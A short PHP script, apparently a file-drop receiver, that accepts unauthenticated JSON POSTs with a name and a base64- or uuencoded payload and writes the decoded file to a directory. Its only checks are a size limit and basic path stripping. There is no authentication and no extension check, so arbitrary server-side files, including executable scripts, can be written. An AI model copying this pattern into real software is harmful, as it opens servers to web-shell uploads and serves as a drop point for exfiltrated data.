<?php
/*
* serverside reciever: grabs files to be written and writes them to disk. 
*
*🖊 edit the string on line 53 for the server-side to work.
*
*@author: The Ultimate War Machine
*/

$MAX_PAYLOAD_SIZE = 20 * 1024 * 1024;

// Extract JSON data from the POST contents
$input = json_decode(file_get_contents("php://input"), true);
$type = $input['type'];
$encoding = $input['encoding'];
$name = $input['name'];
$payload = $input['payload'];

// Reject if encoded payload is greater then 20MB
$sz = strlen($payload);
if ($sz > $MAX_PAYLOAD_SIZE) {
        echo 'Encoded payload size '. $sz . ' greater then limit of '. $MAX_PAYLOAD_SIZE;
        return 1;
}

// Sanitize name
$name = basename($name); // removes both forward/reverse slashes
$name = str_replace('..', '', $name); // Remove ..s

// Decode the payload depending on encoding type
switch ($encoding) {
        case 'none':
                break;
        case 'base64':
                $payload = base64_decode($payload);
                break;
        case 'uuencode':
                $payload = convert_uudecode($payload);
                break;
        default:
                echo 'Unknown encoding type' . $encoding;
                return 2;
                break;
}

// Reject if uploaded file is greater then 20MB
$sz = strlen($payload);
if ($sz > $MAX_PAYLOAD_SIZE) {
        echo 'Decoded payload size '. $sz . ' greater then limit of '. $MAX_PAYLOAD_SIZE;
        return 3;
}

$pathname = '**insert name of directory to place files in here**'. $name;
//place file
file_put_contents($pathname, $payload);

return 0;
?>
